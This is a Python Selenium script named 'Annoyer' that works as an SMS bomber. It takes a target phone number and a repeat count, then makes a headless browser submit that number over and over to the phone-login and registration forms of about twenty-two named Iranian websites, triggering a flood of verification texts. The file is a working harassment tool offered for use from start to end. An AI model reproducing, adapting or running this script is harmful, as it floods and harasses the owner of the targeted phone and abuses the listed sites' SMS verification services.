# Annoyer

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys

banner = """


 █████╗ ███╗   ██╗███╗   ██╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗████╗  ██║████╗  ██║██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
███████║██╔██╗ ██║██╔██╗ ██║██║   ██║ ╚████╔╝ █████╗  ██████╔╝
██╔══██║██║╚██╗██║██║╚██╗██║██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                              
 ____________________________________________________
|                                                    |
| [--] Name: Annoyer v1.0                            |
|                                                    |
| [--] Developer: Reza Ghasemi                       |
|                                                    |
| [--] Link: https://github.com/zaqas/Annoyer        |
|                                                    |
|                                                    |
|____________________________________________________|
"""

print(banner)

number = input('Please enter a phone number:\n')
n = int(input('How many times should we bomb this number?\n'))
i = 0

chromeOptions = Options()
chromeOptions.headless = True
browser = webdriver.Chrome(options=chromeOptions)

while i < n:

    # Ghafari Diet
    try:
        browser.get('https://www.ghafaridiet.com/fa/main.html')
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(number)
        browser.find_element_by_xpath('/html/body/footer/div[1]/div/div/div[1]/div/div[3]/form/button').click()
        print('Ghafari Diet [✔]')
    except Exception:
        print('Ghafari Diet [❌]')
      
    # Anten
    try:
        browser.get('http://anten.ir')
        browser.find_element_by_css_selector("button.btn-sm:nth-child(1)").send_keys(Keys.ENTER)

        browser.find_element_by_css_selector('#__BVID__51___BV_modal_body_ > div > div > div > div > input').send_keys(
            number)
        browser.find_element_by_css_selector('#__BVID__51___BV_modal_footer_ > div > div > div > button').send_keys(
            Keys.ENTER)
        print('Anten [✔]')

    except Exception:
        print('Anten [❌]')

    # Sheypoor
    try:
        browser.get('https://www.sheypoor.com/session')
        browser.find_element_by_id('username').send_keys(number)
        browser.find_element_by_css_selector('p.button-bar:nth-child(6) > button:nth-child(1)').send_keys(Keys.ENTER)
        print('Sheypoor [✔]')
    except Exception:
        print('Sheypoor [❌]')

    # https://sanjagh.pro
    try:

        browser.get('https://sanjagh.pro/tehran/login')
        browser.find_element_by_xpath(
            '/html/body/div[1]/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/input').send_keys(number)
        browser.find_element_by_xpath(
            '/html/body/div[1]/div[2]/div/div/div[2]/div/div/div/div/div/div[3]/button').click()
        print('Sanjagh [✔]')
    except Exception:
        print('Sanjagh [❌]')

    # https://bimito.com/
    try:
        browser.get('https://bimito.com/bazaryabi')
        browser.find_element_by_xpath('//*[@id="username"]').send_keys(number)
        browser.find_element_by_css_selector('#checkPhoneNumber > span:nth-child(1)').click()
        print('Bimito [✔]')
    except Exception:
        print('Bimito [❌]')

    # https://snappfood.ir/
    try:
        browser.get('https://snappfood.ir/')
        browser.find_element_by_xpath('//*[@id="homepage"]/main/article/div[2]/section/div[1]/div[1]/input').send_keys(
            number)
        browser.find_element_by_xpath('//*[@id="homepage"]/main/article/div[2]/section/div[1]/div[1]/div/p').click()
        print('Snapp! Food [✔]')
    except Exception:
        print('Snapp! Food [❌]')

    # https://chilivery.com/
    try:
        browser.get('https://chilivery.com/')
        browser.find_element_by_css_selector('input.form-control:nth-child(2)').send_keys(number)
        browser.find_element_by_css_selector('.btn-green-2').click()
        print('Chilivery [✔]')
    except Exception:
        print('Chilivery [❌]')

    #  https://gap.im
    try:

        browser.get('https://web.gap.im/#/')
        browser.find_element_by_css_selector('#lgp_PhoneNumber').send_keys(number.replace('0', '', 1))
        browser.find_element_by_xpath('//*[@id="sign-in-button"]').click()
        print('Gap [✔]')
    except:
        print('Gap [❌]')

    # ihome.ir
    try:

        browser.get('https://accounts.ihome.ir/login')
        browser.find_element_by_css_selector('#username').send_keys(number.replace('0', '', 1))
        browser.find_element_by_xpath('//*[@id="app"]/div/div[2]/div/div[1]/div[3]/button').click()
        print('ihome [✔]')
    except Exception:
        print('ihome [❌]')

    # https://www.namava.ir/
    try:

        browser.get('https://www.namava.ir/auth/register-phone')
        browser.find_element_by_css_selector('.t-input-0-1-51').send_keys(number.replace('0', '', 1))
        browser.find_element_by_xpath('//*[@id="register-phone-request"]').click()
        print('Namava [✔]')
    except Exception:
        print('Namava [❌]')

    # https://www.drsaina.com
    try:

        browser.get('https://www.drsaina.com/RegisterLogin')
        browser.find_element_by_xpath(
            '/html/body/main/section/form/div[1]/div/div/div/div/div[3]/ul/li[1]/input').send_keys(number)
        browser.find_element_by_xpath('/html/body/main/section/form/div[1]/div/div/div/div/div[3]/ul/li[2]/a').click()

        print('Dr Saina [✔]')
    except Exception:
        print('Dr Saina [❌]')

    # https://vindad.com
    try:

        browser.get('https://vindad.com/signin/')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(number)
        browser.find_element_by_xpath('/html/body/div[2]/section/div/div/div[1]/div/div/div[2]/form/button').click()
        print('Vindad [✔]')
    except Exception:
        print('Vindad [❌]')

    # https://wishato.com/users/auth
    try:
        browser.get('https://wishato.com/users/auth')
        browser.find_element_by_css_selector('div.si-container:nth-child(4) > input:nth-child(4)').send_keys(number)
        browser.find_element_by_css_selector('.reg-form > button:nth-child(5)').send_keys(Keys.ENTER)
        print('Wishato [✔]')
    except Exception:
        print('Wishato [❌]')

    # https://check.itoll.ir/register
    try:
        browser.get('https://check.itoll.ir/register')
        browser.find_element_by_id('mobile').send_keys(number)
        browser.find_element_by_css_selector('.waves-effect').send_keys(Keys.ENTER)
        print('Check Itoll [✔]')
    except Exception:
        print('Check Itoll [❌]')

    # https://dongipal.ir/
    try:

        browser.get('https://dongipal.ir/')
        browser.find_element_by_css_selector('#heroSubscribePhone').send_keys(number)
        browser.find_element_by_xpath('//*[@id="heroSubscribeButton"]').click()
        print('Dongipal [✔]')
    except Exception:
        print('Dongipal [❌]')

    # https://lendo.ir/user/register
    try:
        browser.get('https://lendo.ir/user/register')
        browser.find_element_by_css_selector('.phone_validation').send_keys(number)
        browser.find_element_by_css_selector('.input_pass').send_keys('111111111')
        browser.find_element_by_css_selector('.custom_btn').send_keys(Keys.ENTER)
        print('Lendo [✔]')
    except:
        print('Lendo [❌]')

    # https://takhfifan.com/
    try:
        browser.get('https://takhfifan.com/mobile/')
        browser.find_element_by_css_selector('.ui_input_label').send_keys(number)
        browser.find_element_by_id('submit').send_keys(Keys.ENTER)
        print('Takhfifan [✔]')
    except Exception:
        print('Takhfifan [❌]')

    # https://alopeyk.com/
    try:
        browser.get('https://alopeyk.com/#section-register-anchor')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(number)
        browser.find_element_by_xpath(
            '/html/body/div[1]/div/main/section[3]/div/div/div/div[1]/div/div[2]/form/div[2]/button').send_keys(
            Keys.ENTER)
        print('AloPeyk [✔]')
    except Exception:
        print('AloPeyk [❌]')

    # https://www.khanoumi.com/
    try:

        browser.get('https://www.khanoumi.com/register')
        browser.find_element_by_xpath('//*[@id="email"]').send_keys(number)
        browser.find_element_by_xpath('//*[@id="formSub"]').click()
        print('Khanoumi [✔]')
    except Exception:
        print('Khanoumi [❌]')

    # https://fidibo.com
    try:
        browser.get('https://fidibo.com/login')
        browser.find_element_by_css_selector('.btn-primary').click()
        browser.find_element_by_id('mobile_number').send_keys(number)
        browser.find_element_by_id('login_with_sms').click()
        print('Fidibo [✔]')
    except Exception:
        print('Fidibo [❌]')

    # https://ruban.com
    try:

        browser.get('https://ruban.com/user/register')
        browser.find_element_by_xpath('//*[@id="edit-name"]').send_keys(number)
        browser.find_element_by_xpath('//*[@id="edit-submit"]').click()
        print('Ruban [✔]')
    except Exception:
        print('Ruban [❌]')

    # https://sabketo.com
    try:

        browser.get('https://microketab.sabketo.com/register')
        browser.find_element_by_css_selector('#phoneNumber').send_keys(number)
        browser.find_element_by_xpath('//*[@id="otpReq"]').click()
        print('Sabketo [✔]')
    except Exception:
        print('Sabketo [❌]')

    print('**************')
    i = i + 1
